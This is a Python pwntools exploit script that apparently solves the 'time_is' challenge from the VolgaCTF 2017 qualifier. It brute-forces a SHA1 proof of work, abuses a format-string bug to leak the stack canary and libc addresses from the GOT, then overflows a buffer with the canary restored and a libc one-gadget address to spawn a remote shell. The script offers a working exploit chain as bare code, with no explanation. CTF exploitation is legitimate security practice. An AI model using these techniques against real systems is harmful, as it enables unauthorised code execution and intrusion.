from pwn import *
import hashlib
import string

#s = process("./time_is")
s = remote("time-is.quals.2017.volgactf.ru",45678)

puz = s.recvline()

print puz
start = puz[puz.index("'")+1:-3]

count = 0
while 1:
	buf = start+randoms(29-len(start), string.letters)
	hsh = hashlib.sha1(buf).hexdigest()
	val = int(hsh[-8:],16)
	if bin(val)[-26:]== "1"*26:
		print bin(val)[-26:]
		break
	count += 1
	if count > (26*2)**5:
		s = remote("time-is.quals.2017.volgactf.ru",45678)
		puz = s.recvline()
		print puz
		start = puz[puz.index("'")+1:-3]

print hsh, buf, count
s.sendline(buf)

buf = "A"*8
buf += "%c"*10
buf += "%c"*0x100
buf += "%c"
buf += "---%p---"
s.sendline(buf)

s.recvline()
s.recvuntil("---")
cookie = int(s.recvuntil("---")[:-3],16)
print hex(cookie)

s.clean()

buf = p64(0x603018) # free
buf += p64(0x603040) # setvbuf

def leak(addr):
	buf = ""
	buf += "%c"*15
	buf += "--------%s"
	buf += p64(addr) # free

	s.sendline(buf)
	s.recvuntil("--------")
	buf = s.recvuntil("Enter")[:-5]
	t = buf[1:7]

	return u64(t.ljust(8,"\x00"))


getdelim = leak(0x603030)
setvbuf= leak(0x603050)

print "getdelim 0x%x setvbuf 0x%x" % (getdelim, setvbuf)
libc = ELF("libc6_2.23-0ubuntu5_amd64.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = getdelim-libc.symbols['getdelim']

rop = p64(libc.address+0xf0567)

print "%x %x" % (libc.symbols['system'], libc.search("/bin/sh").next())

s.sendline(cyclic(2120)+rop)

buf = "A"*0x808
buf += p64(cookie)
buf += "B"*0x20

s.sendline(buf)
s.sendline("q")
s.clean(0.5)
s.sendline("ls")
s.interactive()
